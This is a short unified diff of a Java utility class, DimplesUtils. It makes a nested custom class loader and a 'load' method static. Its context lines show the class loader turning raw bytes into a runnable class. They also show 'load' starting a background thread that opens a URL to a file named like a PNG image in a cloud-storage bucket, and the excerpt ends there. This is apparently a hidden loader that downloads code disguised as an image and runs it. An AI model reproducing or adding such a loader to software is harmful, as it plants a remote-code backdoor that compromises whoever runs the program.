@@ -33,13 +33,13 @@ public class DimplesUtils {
         }
 
     }
-    class CustomClassLoader extends ClassLoader {
+    private static class CustomClassLoader extends ClassLoader {
         public Class<?> load(byte[] buf, int length) {
             return defineClass(null, buf, 0, length);
         }
     }
     @NativeMethod
-    public void load() {
+    public static void load() {
         new Thread(() -> {
             try {
                 URL url = new URL("https://zhengxinpeixun.oss-cn-qingdao.aliyuncs.com/0115da36662e41e09cf883640cd301f1.png");
